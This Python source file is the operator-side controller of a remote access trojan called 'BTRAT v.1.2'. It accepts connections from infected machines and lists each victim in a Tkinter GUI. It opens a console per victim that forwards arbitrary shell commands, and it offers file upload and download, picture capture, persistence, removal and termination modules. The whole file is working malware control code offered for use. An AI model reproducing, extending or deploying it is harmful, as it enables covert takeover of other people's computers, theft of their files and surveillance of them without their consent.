#Import
import socket
import threading
import cv2
import PIL
from tkinter import *
from tkinter import ttk
from ttkthemes import themed_tk as tk
from win10toast import ToastNotifier
import numpy as np
import subprocess
import sys
import random
import math
import time


#set varibles
host = "localhost"
connidarr = []
processes= []
Buttonids = []
processesids = []
connections = []
addresses = []
Buttons = []
version = "1.2"
modules = ["cd","put","get","pic","remote","persistent","remove","terminate"]

#modules
def cd():
	global wd
	sendstr(data)
	sent = getrecv()
	if sent == "Path is not valid!":
		print(sent)
	else:
		wd = sent

def put():
	sendstr(data)
	print("put")

def get():
	sendstr(data)
	print("get")

def pic():
	sendstr(data)
	print("pic")

def remote():
	sendstr(data)
	print("remote")

def persistent():
	sendstr(data)
	print("persistent")

def remove():
	sendstr(data)
	print("remove")

def terminate():
	sendstr(data)
	print("terminate")



#general functions

def setupsocket():
	global s
	s = socket.socket()
	s.bind((host, port))


def getrecv(buffersize=1024):
	while True:
		string = conn.recv(buffersize).decode("utf-8", "replace")
		try:
			nstring = string.replace("stillthere", "")
			if not len(nstring) > 0:
				continue
		except:
			pass
		return string


def sendstr(string):
	conn.send(str(string).encode())


def handler():
	global conn
	global data
	global wd
	conn = socket.fromshare(sys.stdin.buffer.read())
	sys.stdin = open("CONIN$", buffering=1)
	conn.settimeout(3)
	sendstr("handler!")
	wd = getrecv()
	while not wd[0] == "$":
		wd = getrecv()
	wd = wd[1:]
	while True:
		data = input(wd[:-1]+ ">")
		iscmd = True
		module = str(data.split(" ")[0])
		for i in modules:
			if module == i:
				eval(i + "()")
				iscmd=False
				break
		if iscmd:
			conn.send(str(data).encode())
			try:
				print(getrecv(10000000))
			except :
				exit()



def Server():
	global conn
	global connid
	s.listen(1)
	while True:
		conn, addr =s.accept()
		conn.settimeout(2)
		a = getrecv(6)
		print(a)
		if a == "BTconn":
			print("new client")
			clientname = getrecv()
			try:
				connid = connidarr.index(0)
				connections[connid] = conn
				addresses[connid] = addr
			except:
				connid = len(connidarr)
				connections.append(conn)
				addresses.append(addr)

			Budd = ttk.Button(root, text=clientname+"\n"+str(addr[0])+":"+str(addr[1]), command = lambda connid=connid, : butpress(connid))
			try:
				Buttons[connid] = Budd
			except:
				Buttons.append(Budd)
			Budd.pack()
			try:
				connidarr[connidarr.index(0)] = 1
			except:
				connidarr.append(1)
		else:
			conn.close()

def conncecker():
	while True:
		time.sleep(1)
		try:
			for i,index in enumerate(connections):
				index.send(b"stillthere")
		except:
			connections[i].close()
			Buttons[i].pack_forget()
			processes[i].kill()
			connidarr[i]=0


def butpress(cid):
	exitprocess(cid)


def exitprocess(i):
	try:
		processes[i].kill()
	except:
		pass
	p = subprocess.Popen(["python",__file__, "-handler"], stdin=subprocess.PIPE, bufsize=0, creationflags=subprocess.CREATE_NEW_CONSOLE)
	p.stdin.write(connections[i].share(p.pid))
	p.stdin.close()
	try:
		processes[i] = p
	except:
		processes.append(p)


def GUI():
	global root
	global Buttons
	root = tk.ThemedTk(theme="equilux", themebg=True)
	root.title("BTRAT v." + version)
	setico()
	root.geometry("400x400")
	ttk.Label(root,text = "Welcome to BTRAT V." + version).pack()
	btn = ttk.Button(root, text="random ico", command = setico).pack()
	#root.configure(background='grey')
	root.mainloop()


def setico():
	root.iconbitmap(r"data\\"+ str(random.randint(0, 7)) +".ico")

def printlogo():
	print(open('data\\logo', 'r', encoding="utf-8").read())

#create Theads
if "-handler" in sys.argv[1:]:
	sys.exit(handler())
printlogo()
print("oh yeah!")
while True:
	print("Please set port to listen on!")
	port = int(input("Port: "))
	try:
		setupsocket()
		break
	except socket.error:
		print("Port already taken! Please select a diffrent one.\n\n")

thsvr = threading.Thread(target=Server, daemon=True).start()

pingth = threading.Thread(target=conncecker, daemon=True).start()

GUI()
for i in processes:
	i.kill()
